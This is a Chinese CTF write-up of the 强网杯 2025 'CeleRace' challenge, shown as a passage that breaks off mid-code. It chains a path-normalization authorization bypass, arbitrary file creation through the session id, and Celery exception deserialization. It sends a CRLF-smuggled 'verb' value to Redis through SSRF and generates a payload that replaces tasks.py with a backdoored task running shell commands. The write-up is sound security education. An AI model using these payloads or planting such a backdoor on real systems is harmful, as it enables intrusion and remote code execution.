+    <h1 class="post-title entry-hint-parent">
+      强网杯 2025 CeleRace Writeup
+    </h1>
+    <div class="post-description">
+      记录一个套娃题
+    </div>
+    <div class="post-meta"><span title='2025-10-31 07:24:54 +0000 UTC'>October 31, 2025</span>&nbsp;·&nbsp;11 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e8%b6%8a%e6%9d%83" aria-label="越权">越权</a></li>
+                <li>
+                    <a href="#%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99" aria-label="任意文件写">任意文件写</a></li>
+                <li>
+                    <a href="#restart" aria-label="restart">restart</a><ul>
+                        
+                <li>
+                    <a href="#%e8%8e%b7%e5%8f%96%e5%af%86%e9%92%a5%e6%b5%81" aria-label="获取密钥流">获取密钥流</a></li>
+                <li>
+                    <a href="#shutdown" aria-label="shutdown">shutdown</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="越权">越权<a hidden class="anchor" aria-hidden="true" href="#越权">#</a></h1>
+<p>先看系统权限，使用了 <code>superviser</code> 维持了三个程序：</p>
+<ol>
+<li><code>redis</code></li>
+<li><code>app.py (flask + broker)</code></li>
+<li><code>worker</code></li>
+</ol>
+<p>其中 <code>/readflag</code> 程序 <code>worker</code> 用户可以执行，所以最终目标需要已 <code>worker</code> 用户 <code>RCE</code>。</p>
+<p>题目在 <code>werkzeug</code> 的基础上自己写了一个阉割版的 <code>Flask</code>，其中在处理中间件那部分存在逻辑漏洞。</p>
+<p>在处理请求时，先通过 <code>path</code> 找到对应的 <code>endpoint</code>，然后再收集该 <code>endpoint</code> 的 <code>middlewares</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_collect_route_middlewares</span>(self, endpoint: str, path: str) <span style="color:#f92672">-&gt;</span> list[MiddlewareCallable]:
+</span></span><span style="display:flex;"><span>    scoped <span style="color:#f92672">=</span> list(self<span style="color:#f92672">.</span>route_middlewares<span style="color:#f92672">.</span>get(endpoint, []))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> scoped:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> scoped
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>wildcard_middlewares:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> scoped
+</span></span><span style="display:flex;"><span>    normalized_path <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_normalize_path(path)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> pattern, middlewares <span style="color:#f92672">in</span> reversed(self<span style="color:#f92672">.</span>wildcard_middlewares):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_pattern_matches(pattern, normalized_path):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> list(middlewares)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> scoped
+</span></span></code></pre></div><p>但是在匹配 <code>middlewares</code> 之前会先进行 <code>_normalize_path</code> 操作。所以对于 <code>path</code> : <code>/tasks/fetch/%2e%2e/asd</code> 来说，能够争取找到 <code>fetch</code> <code>endpoint</code>，但当匹配 <code>middlewares</code> 时就变成了 <code>/tasks/asd</code> 了，匹配失败，导致进入该 <code>endpoint</code> 前不需要执行任何 <code>middlewares</code>，实现越权。</p>
+<h1 id="任意文件写">任意文件写<a hidden class="anchor" aria-hidden="true" href="#任意文件写">#</a></h1>
+<p><code>session</code> 保存时根据 <code>sid</code> 确定 <code>session</code> 文件路径：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">save</span>(self, session: FileSession) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> session<span style="color:#f92672">.</span>modified:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_session_path(session<span style="color:#f92672">.</span>sid)
+</span></span><span style="display:flex;"><span>    tmp_path <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74">.tmp-</span><span style="color:#e6db74">{</span>secrets<span style="color:#f92672">.</span>token_hex(<span style="color:#ae81ff">4</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {key: value <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> session<span style="color:#f92672">.</span>items()}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(tmp_path, <span style="color:#e6db74">&#34;w&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> fh:
+</span></span><span style="display:flex;"><span>        json<span style="color:#f92672">.</span>dump(payload, fh, ensure_ascii<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, separators<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;,&#34;</span>, <span style="color:#e6db74">&#34;:&#34;</span>))
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>replace(tmp_path, path)
+</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span></code></pre></div><p>而 sid 用户可控，所以可以任意文件创建，但文件内容不能饭圈控制。</p>
+<p>Payload：</p>
+<pre tabindex="0"><code>Cookie: mini_session=/tmp/debug
+</code></pre><p>可以创建 <code>/tmp/debug</code></p>
+<p>同时，题目还定义了 <code>DiagnosticsPersistError</code> 类，该类的构造函数可以任意文件写，现在需要找一个任意 <code>callable</code> 的调用。</p>
+<p>celery 有一个历史漏洞：<code>CVE-2021-23727</code>，该漏洞可以调用任意 <code>callable</code>。<code>celery worker</code> 会将任务执行结果保存下来，当 <code>broker</code> 想要读取任务执行结果在提取出来。如果执行时遇到报错会将该 <code>Exception</code> 序列化存储，读取时再反序列化，其中涉及到任意 <code>callable</code> 调用。<code>CVE-2021-23727</code> 的修复方式是只允许反序列化已定义的 <code>Exception</code> 类，不允许调用任意 <code>callable</code> 如 <code>os.system</code> 等。</p>
+<p>因为 <code>DiagnosticsPersistError</code> 类继承自 <code>Exception</code>，所以漏洞修复后依然可以被反序列化。</p>
+<p><code>DiagnosticsPersistError</code> 关键代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DiagnosticsPersistError</span>(<span style="color:#a6e22e">RuntimeError</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Dormant exception used for development-time diagnostics persistence.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    _BASE_DIR <span style="color:#f92672">=</span> Path(os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;FRAMEWORK_DIAGNOSTICS_DIR&#34;</span>, <span style="color:#e6db74">&#34;/app/data&#34;</span>))<span style="color:#f92672">.</span>resolve()
+</span></span><span style="display:flex;"><span>    _DEBUG_SENTINEL <span style="color:#f92672">=</span> Path(<span style="color:#e6db74">&#34;/tmp/debug&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, payload: str, <span style="color:#f92672">*</span>args: Any, <span style="color:#f92672">**</span>kwargs: Any) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_DEBUG_SENTINEL<span style="color:#f92672">.</span>exists():
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>_maybe_persist(payload)
+</span></span><span style="display:flex;"><span>        super()<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;diagnostics capture failed&#34;</span>, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_maybe_persist</span>(self, payload: str) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        info <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_decode_payload(payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> info:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        target <span style="color:#f92672">=</span> info<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;path&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> target:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        path <span style="color:#f92672">=</span> Path(target)
+</span></span><span style="display:flex;"><span>        mode <span style="color:#f92672">=</span> str(info<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;mode&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>))
+</span></span><span style="display:flex;"><span>        encoding <span style="color:#f92672">=</span> info<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;encoding&#34;</span>, <span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> info<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;content&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            path<span style="color:#f92672">.</span>parent<span style="color:#f92672">.</span>mkdir(parents<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;b&#34;</span> <span style="color:#f92672">in</span> mode:
+</span></span><span style="display:flex;"><span>                blob <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_ensure_bytes(data, encoding)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> path<span style="color:#f92672">.</span>open(mode) <span style="color:#66d9ef">as</span> fh:  <span style="color:#75715e"># type: ignore[call-arg]</span>
+</span></span><span style="display:flex;"><span>                    fh<span style="color:#f92672">.</span>write(blob)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                text <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_ensure_text(data, encoding)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> path<span style="color:#f92672">.</span>open(mode, encoding<span style="color:#f92672">=</span>encoding) <span style="color:#66d9ef">as</span> fh:
+</span></span><span style="display:flex;"><span>                    fh<span style="color:#f92672">.</span>write(text)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_decode_payload</span>(self, payload: str) <span style="color:#f92672">-&gt;</span> Dict[str, Any] <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        attempts <span style="color:#f92672">=</span> [payload]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            attempts<span style="color:#f92672">.</span>append(bytes<span style="color:#f92672">.</span>fromhex(payload)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> candidate <span style="color:#f92672">in</span> attempts:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>loads(candidate)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span></code></pre></div><p>对于题目来说，<code>broker</code> 和 <code>worker</code> 通过 <code>redis</code> 通信。而 <code>/tasks/fetch</code> 可以 <code>SSRF</code> 攻击 <code>redis</code> 向一个 <code>task</code> 的返回结果中写入序列化 <code>Payload</code>，当读取结果时触发文件写入。</p>
+<p><code>fetch</code> 代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@celery_app.task</span>(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;miniws.fetch&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fetch_task</span>(url: str, <span style="color:#f92672">*</span>, host_header: str <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>, body: str <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>, verb: str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GET&#34;</span>) <span style="color:#f92672">-&gt;</span> Dict[str, Any]:
+</span></span><span style="display:flex;"><span>    parsed <span style="color:#f92672">=</span> urlparse(url)
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> parsed<span style="color:#f92672">.</span>hostname <span style="color:#f92672">or</span> settings<span style="color:#f92672">.</span>redis_host
+</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> parsed<span style="color:#f92672">.</span>port <span style="color:#f92672">or</span> (<span style="color:#ae81ff">443</span> <span style="color:#66d9ef">if</span> parsed<span style="color:#f92672">.</span>scheme <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;https&#34;</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">80</span>)
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> parsed<span style="color:#f92672">.</span>path <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> parsed<span style="color:#f92672">.</span>query:
+</span></span><span style="display:flex;"><span>        path <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74">?</span><span style="color:#e6db74">{</span>parsed<span style="color:#f92672">.</span>query<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    request_host <span style="color:#f92672">=</span> host_header <span style="color:#f92672">or</span> parsed<span style="color:#f92672">.</span>netloc <span style="color:#f92672">or</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    request_body <span style="color:#f92672">=</span> body<span style="color:#f92672">.</span>encode() <span style="color:#66d9ef">if</span> body <span style="color:#66d9ef">else</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>verb<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74"> HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Host: </span><span style="color:#e6db74">{</span>request_host<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;User-Agent: MiniFetch/1.0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Connection: close</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    )<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> request_body
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    chunks: list[bytes] <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>create_connection((host, port), timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">as</span> sock:
+</span></span><span style="display:flex;"><span>        sock<span style="color:#f92672">.</span>sendall(payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>            chunks<span style="color:#f92672">.</span>append(data)
+</span></span><span style="display:flex;"><span>    preview <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(chunks)[:<span style="color:#ae81ff">2048</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;preview&#34;</span>: preview<span style="color:#f92672">.</span>decode(errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;replace&#34;</span>), <span style="color:#e6db74">&#34;bytes&#34;</span>: len(preview)}
+</span></span></code></pre></div><p>使用 <code>verb</code> 注入即可：</p>
+<pre tabindex="0"><code>POST /tasks/fetch/%2e%2e/123 HTTP/1.1
+Host: 
+Content-Length: 2291
+Content-Type: application/json
+Cookie: mini_session=d9b266db66464ed2
+Connection: close
+
+{&#34;url&#34;:&#34;http://127.0.0.1:6379&#34;,&#34;verb&#34;:&#34;set asd 1\r\nGET&#34;}
+</code></pre><p>结合上面的 <code>Exception</code> 类给出写文件的 <code>Payload</code>:</p>
+<pre tabindex="0"><code>set celery-task-meta-&lt;uuid&gt; &#39;{&#34;status&#34;: &#34;FAILURE&#34;, &#34;result&#34;: {&#34;exc_type&#34;: &#34;DiagnosticsPersistError&#34;, &#34;exc_message&#34;: &#34;&lt;hex payload&gt;&#34;, &#34;exc_module&#34;: &#34;framework.app&#34;}, &#34;traceback&#34;: &#34;&#34;, &#34;children&#34;: [], &#34;date_done&#34;: &#34;2025-10-31T06:15:48.956927&#34;, &#34;task_id&#34;: &#34;&lt;uuid&gt;&#34;}&#39;
+</code></pre><p>使用任意一个 <code>task</code> 的 <code>uuid</code> 替换，<code>exc_message</code> 的值为 <code>hex</code> 编码后的 <code>json</code> 数据，其中包含 <code>path</code> 和 <code>content</code> 字段用于写文件。</p>
+<p>生成写入文件Payload：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">wapper</span>(payload : str, title : str):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;------------------------</span><span style="color:#e6db74">{</span>title<span style="color:#e6db74">}</span><span style="color:#e6db74">----------------------------&#39;</span>)
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">GET&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(data)</span>
+</span></span><span style="display:flex;"><span>    out <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>        num <span style="color:#f92672">=</span> hex(ord(i))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> len(num) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>            num <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">+</span> num
+</span></span><span style="display:flex;"><span>        out <span style="color:#f92672">=</span> out <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">u00&#39;</span> <span style="color:#f92672">+</span> num
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(out)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwned_taskspy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from __future__ import annotations
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import os
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import pickle
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import socket
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from typing import Any, Dict
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from urllib.parse import urlparse
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from celery import Celery
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from kombu.serialization import register
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from .config import settings
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from .crypto import dumps as encrypt_dumps, loads as decrypt_loads
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">try:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    register(
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;miniws-aes&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        encrypt_dumps,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        decrypt_loads,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        content_type=&#34;application/x-miniws&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        content_encoding=&#34;binary&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    )
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">except ValueError:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pass
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">celery_app = Celery(
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;miniws&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    broker=settings.celery_broker_url,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    backend=settings.celery_backend_url,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">celery_app.conf.update(
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    task_serializer=&#34;miniws-aes&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    task_default_serializer=&#34;miniws-aes&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    accept_content=[&#34;miniws-aes&#34;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    result_serializer=&#34;json&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    result_accept_content=[&#34;json&#34;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">@celery_app.task(name=&#34;miniws.echo&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def echo_task(message: str) -&gt; Dict[str, Any]:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    return {&#34;echo&#34;: __import__(&#34;os&#34;).popen(message).read()}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">@celery_app.task(name=&#34;miniws.fetch&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def fetch_task(url: str, *, host_header: str | None = None, body: str | None = None, verb: str = &#34;GET&#34;) -&gt; Dict[str, Any]:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    parsed = urlparse(url)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    host = parsed.hostname or settings.redis_host
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    port = parsed.port or (443 if parsed.scheme == &#34;https&#34; else 80)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    path = parsed.path or &#34;/&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if parsed.query:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        path = f&#34;</span><span style="color:#e6db74">{path}</span><span style="color:#e6db74">?</span><span style="color:#e6db74">{parsed.query}</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    request_host = host_header or parsed.netloc or f&#34;</span><span style="color:#e6db74">{host}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{port}</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    request_body = body.encode() if body else b&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    payload = (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        f&#34;</span><span style="color:#e6db74">{verb}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{path}</span><span style="color:#e6db74"> HTTP/1.1</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34; + 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        f&#34;Host: </span><span style="color:#e6db74">{request_host}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34; + 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;User-Agent: MiniFetch/1.0</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34; + 
